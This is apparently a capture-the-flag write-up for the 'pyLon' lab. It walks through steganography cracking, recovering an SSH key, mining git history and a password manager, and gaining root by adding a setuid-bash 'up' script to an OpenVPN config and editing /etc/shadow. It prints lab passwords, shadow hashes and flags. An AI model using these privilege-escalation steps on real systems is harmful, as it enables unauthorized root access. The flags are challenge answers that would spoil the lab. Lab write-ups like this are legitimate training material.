> pyLon

**export IP=10.10.187.76**

# Recon

We got a file `pepper.jpg`. 

## exiftool

```
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 381 KiB
File Modification Date/Time     : 2021:04:08 09:34:16-04:00
File Access Date/Time           : 2021:04:08 09:35:18-04:00
File Inode Change Date/Time     : 2021:04:08 09:35:03-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

And we can see that we have a file hiding inside the jpg. But we can't extract oit using steghide no password. Let's crack it using stegcracker.

stegcracker pepper.jpg rockyou.txt => `pepper`. And we have a file `lone`. by first look I probably I guessed it is a ssh id_rsa file but encode in base64.

1. cat lone | base64 -d > lone.decode => Turns out to be a gzip file
2. tar -xvf lone.tgz => We got lone_id private SSH key

# Rustscan

rustscan --ulimit 5000 -a $IP -- -sC -sV -Pn -A -oN rustscan.log

```
22/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
222/tcp open  ssh     syn-ack OpenSSH 8.4 (protocol 2.0)
```

We have to try both ports.👷

ssh -i lone_id -p 222 lone@$IP

We are in but we are prompted to enter encrption key. Now we know that we have cyberchef with the recipies. Let's try the same password `pepper` and we have `2_[-I2_[0E2DmEK`. We are in!!🔥

We can try all the options. Starting with `[1] Decrypt a password.`

```
         SITE                        USERNAME
 [1]     pylon.thm                   lone✅           
 [2]     FLAG 1                      FLAG 1                      
    Password for pylon.thm

        Username = lone
        Password = +2BRkRuE!w7>ozQ4 => Let's try this for port 22
```

```
         SITE                        USERNAME
 [1]     pylon.thm                   lone           
 [2]     FLAG 1                      FLAG 1✅                      
    Password for FLAG 1

        Username = FLAG 1
        Password = THM{homebrew_password_manager}
```

# user.txt

```
TMM{easy_does_it}
```

We have SSH access as lone. And we got some interesting files.

## .gitconfig 

```
[user]
	email = lone@pylon.thm
	name = lone
```

Let's checkout the pyLon folder. We have some files but not particularly interseting. But we know that we have git let's look for some commits.

git log 

```
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

Hmm. Nothing intersting. Let's if there is intersting in previous versions.

git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da=> Oooh we have an intersting file `pyLon.db` and `pyLon_pwMan.py`!!🚨

python3 pyLon_pwMan.py => We are again prompted with encryption key

```
        [1] List passwords.✅
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu

         SITE                        USERNAME
 [1]     pylon.thm_gpg_key           lone_gpg_key                

 [2] Decrypt a password.

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD
```

## Decrypting gpg file 

gpg -d note_from_pood.gpg 

```
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.
```

sudo -l

```
User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

Since `pood` user has given his creds let's check'em out! 

# user2.txt

```
THM{homebrew_encryption_lol}
```

# Privilege Escalation 

sudo -l

```
User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

Looking at openvpn's manual page we find that we can run a command on suucessful connection. Let's write a script and make it run!

## /tmp/up.sh

```
#!/bin/bash

cp /bin/bash /tmp
chmod 4777 /tmp/bash
```

chmod 777 /tmp/up.sh
sudoedit /opt/openvpn/client.ovpn

Add 2 lines

```
client
dev tun
proto udp
remote 127.0.0.1 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
cipher AES-256-CBC
script-security 2
up /tmp/up.sh
```

Now let's switch to lone and start the vpn connection. Once connected we have our bash in /tmp. `bash -p` gives us a root shell! We have a file `/root/root.txt.gpg` but we can't decode it using gpg.

id

```
uid=1002(lone) gid=1002(lone) euid=0(root) groups=1002(lone)
```

We can copy pood's user hash in /etc/shadow and paste it in root's and by this we can su as root using pood's password.

```
root:$6$ivWUkR1k$XnYAc7OJJ63P/lgYzNWLiFMydrOFP/qrARMNcjHX1H4sIGFEyVQKAOedWLDY2nHU8rxx7hABmr4JT3uM74Bm5.:18480:0:99999:7:::
pylon:$6$kBtkIi0w$zj80m4J62jDhdffz6U.Fy/9rBhfLOD5YybkOXUrwQthF1svHTXfB6wCJ7KaZ9Dl0euJmjFbiIbtQIICIpE04W0:18657:0:99999:7:::
pood:$6$ivWUkR1k$XnYAc7OJJ63P/lgYzNWLiFMydrOFP/qrARMNcjHX1H4sIGFEyVQKAOedWLDY2nHU8rxx7hABmr4JT3uM74Bm5.:18657:0:99999:7:::
lone:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18657:0:99999:7:::
```

gpg -d root.txt.gpg 

```
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{OpenVPN_script_pwn}
```